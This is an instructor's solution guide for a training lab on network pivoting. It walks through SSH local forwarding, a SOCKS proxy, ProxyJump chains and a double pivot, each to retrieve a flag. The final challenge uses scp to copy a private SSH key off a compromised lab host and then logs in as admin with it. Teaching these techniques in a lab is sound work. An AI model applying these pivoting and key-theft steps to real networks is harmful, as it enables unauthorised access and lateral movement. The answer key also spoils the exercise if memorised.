# Lab 03: Instructor Walkthrough & Solution Guide
**Theme:** Pivoting, Tunneling & Lateral Movement

*(Note: The exact passwords and flags are dynamically generated per student. The student retrieves their specific `pentest` password from the web portal at `http://<VM_IP>:8083`.)*

### Challenge 1: SSH Local Port Forwarding
**Goal:** Access the internal HTTP web server on **ALPHA-1** (`10.10.10.10:80`).
**Solution:**
The student must create a local port forward (`-L`) from their Kali machine, through `PIVOT-1` (`port 2222`), pointing to the internal ALPHA-1 server.
1. Run this command on Kali:
   ```bash
   ssh -L 8080:10.10.10.10:80 pentest@<VM_IP> -p 2222 -N
   ```
2. Open a web browser and go to `http://127.0.0.1:8080`.
3. The page will load the ALPHA-1 internal dashboard, revealing **`FLAG{LOCALFWD...}`**.

### Challenge 2: Dynamic SOCKS5 Proxy
**Goal:** Access the internal monitoring dashboard on **ALPHA-2** (`10.10.10.20:8080`).
**Solution:**
The student sets up a dynamic SOCKS proxy (`-D`) to explore the internal network more freely.
1. Run this command on Kali to open a local SOCKS proxy on port `1080`:
   ```bash
   ssh -D 1080 pentest@<VM_IP> -p 2222 -N
   ```
2. Configure `/etc/proxychains4.conf` to use `socks5 127.0.0.1 1080`.
3. Use proxychains to curl the internal server:
   ```bash
   proxychains4 curl http://10.10.10.20:8080/
   ```
4. The output will reveal **`FLAG{SOCKS...}`**.

### Challenge 3: SSH ProxyJump
**Goal:** Get an interactive SSH shell on **ALPHA-2** (`10.10.10.20`).
**Solution:**
The student must use ProxyJump (`-J`) to transparently route an SSH connection through PIVOT-1 to reach ALPHA-2.
1. Connect via ProxyJump (they will be prompted for the password twice—once for PIVOT-1, once for ALPHA-2. It is the same password):
   ```bash
   ssh -J pentest@<VM_IP>:2222 alpha@10.10.10.20
   ```
2. Once inside the ALPHA-2 shell, read the flag:
   ```bash
   cat ~/flag.txt
   ```
   *(Yields **`FLAG{PROXYJUMP...}`**)*
3. While exploring the home directory, the student should notice `~/notes.txt` and an SSH private key at `~/.ssh/id_rsa`.

### Challenge 4: Double Pivot (Chained Port Forwarding)
**Goal:** Access the highly restricted HTTP server on **BETA-1** (`172.16.50.10:9090`).
**Solution:**
The BETA segment is physically unreachable from PIVOT-1. The student must jump *through* PIVOT-1, *through* ALPHA-2, and forward a port to BETA-1.
1. Run a chained ProxyJump with a Local Port Forward on Kali:
   ```bash
   ssh -J pentest@<VM_IP>:2222,alpha@10.10.10.20 -L 9090:172.16.50.10:9090 alpha@10.10.10.20 -N
   ```
2. Curl the forwarded port from a new Kali terminal:
   ```bash
   curl http://127.0.0.1:9090/
   ```
3. The output reveals **`FLAG{DOUBLEPIVOT...}`**.

### Challenge 5: SSH Key Lateral Movement
**Goal:** Gain SSH access to **BETA-1** (`172.16.50.10`) as the `admin` user to capture the final flag.
**Solution:**
The student must exfiltrate the `id_rsa` key they found on ALPHA-2, then use it to authenticate as `admin` on BETA-1 via a chained jump.
1. Exfiltrate the key to Kali using `scp` over ProxyJump:
   ```bash
   scp -J pentest@<VM_IP>:2222 alpha@10.10.10.20:~/.ssh/id_rsa ./alpha2_key.pem
   chmod 600 ./alpha2_key.pem
   ```
2. Execute the final lateral movement to BETA-1 using the stolen key and a double-jump:
   ```bash
   ssh -i ./alpha2_key.pem -J pentest@<VM_IP>:2222,alpha@10.10.10.20 admin@172.16.50.10
   ```
3. Once in the BETA-1 shell as `admin`, read the final flag:
   ```bash
   cat ~/flag.txt
   ```
   *(Yields **`FLAG{LATERAL...}`**)*

